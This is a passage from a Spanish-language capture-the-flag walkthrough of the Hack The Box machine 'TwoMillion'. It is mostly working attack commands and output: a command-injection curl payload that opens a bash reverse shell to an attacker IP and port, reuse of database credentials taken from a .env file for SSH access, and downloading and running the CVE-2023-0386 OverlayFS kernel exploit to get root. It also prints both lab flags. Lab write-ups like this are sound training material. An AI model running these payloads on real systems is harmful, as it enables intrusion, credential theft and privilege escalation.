Nos lo genera bien, pero no nos interesa esto, vamos a probar a realizar un `comman injection` a ver si funciona, ya que por detras se esta ejecutando un comando y posiblemente comentando lo siguiente y concatenando un comando podremos ejecutar comandos en el sistema de esta forma:

```shell
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" \
  -d '{"username":"diseo; whoami #"}'
```

Info:

```
www-data
```

Vamos a realizar una `reverse shell` de esta forma, antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora vamos a ejecutar lo siguiente:

```shell
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" \
  -d '{"username":"diseo; bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" #"}'
```

Si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.52] from (UNKNOWN) [10.10.11.221] 52816
bash: cannot set terminal process group (1191): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ whoami
whoami
www-data
```

Vemos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user admin

Si leemos el archivo `Database.php` veremos esto:

```php
<?php

class Database 
{
    private $host;
    private $user;
    private $pass;
    private $dbName;

    private static $database = null;
    
    private $mysql;

    public function __construct($host, $user, $pass, $dbName)
    {
        $this->host     = $host;
        $this->user     = $user;
        $this->pass     = $pass;
        $this->dbName   = $dbName;

        self::$database = $this;
    }
.................................<RESTO DE CODIGO>.................................
```

Vemos que se estan guardando en variables las cosas y si listamos la misma carpeta, veremos este archivo:

```shell
ls -la /var/www/html
```

Info:

```
-rw-r--r--  1 root root   87 Jun  2  2023 .env
.................................<RESTO DE ARCHIVOS>...............................
```

Vemos que hay un archivo que contiene las variables, si lo leemos veremos lo siguiente:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Vamos a conectarnos a la `DDBB` gracias a estos datos:

```shell
mysql -h localhost -u admin -pSuperDuperPass123
```

Info:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1483272
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Pero no veremos nada interesante, vamos a probar si esta contraseña es reutilizable por `SSH` para dicho usuario.

```shell
ssh admin@<IP>
```

Metemos como contraseña `SuperDuperPass123`...

```
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 30 02:16:30 PM UTC 2025

  System load:           0.00439453125
  Usage of /:            91.2% of 4.82GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.221
  IPv6 address for eth0: dead:beef::250:56ff:fe94:ca02

  => / is using 91.2% of 4.82GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Tue Sep 30 11:12:27 2025 from 10.10.16.35
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ whoami
admin
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
a07ca23cbc079e63ab034c5c8f730409
```

## Escalate Privileges

Si investigamos bastante veremos que en el siguiente directorio hay una nota:

```shell
cat /var/mail/admin
```

Info:

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Vemos que nos dice que hay un `CVE` asociado al `kernel` de la maquina victima, si vemos que version es:

```shell
uname -r
```

Info:

```
5.15.70-051570-generic
```

Investigando sobre dicha version de `kernel` veremos que si es vulnerable a lo que pone en la nota, en la siguiente pagina nos muestra los pasos a seguir par explotarla (`CVE-2023-0386`).

URL = [Exploit PoC CVE-2023-0386](https://github.com/sxlmnwb/CVE-2023-0386)

Vamos hacer lo siguiente, primero nos vamos a la carpeta `/tmp`.

```shell
cd /tmp
```

Despues en nuestra maquina atacante:

```shell
git clone https://github.com/sxlmnwb/CVE-2023-0386.git
zip -r CVE-2023-0386.zip CVE-2023-0386/
```

Una vez comprimido nos lo pasamos por un servidor de `python3` de esta forma:

```shell
python3 -m http.server 80
```

En la maquina victima haremos esto:

```shell
wget http://<IP>/CVE-2023-0386.zip
unzip CVE-2023-0386.zip
```

Una vez descomrpimido nos metemos dentro de la carpeta y lo compilamos de esta forma:

```shell
cd CVE-2023-0386/
make all
```

Una vez compilado, lo ejecutaremos de esta forma:

```shell
./fuse ./ovlcap/lower ./gc
```

Info:

```
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```

En la segunda terminal ejecutamos este otro binario:

```shell
./exp
```

Info:

```
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Oct  1 08:22 .
drwxr-xr-x 6 root   root     4096 Oct  1 08:22 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
171f59c427d2efdd9cae417d79dd1174
```
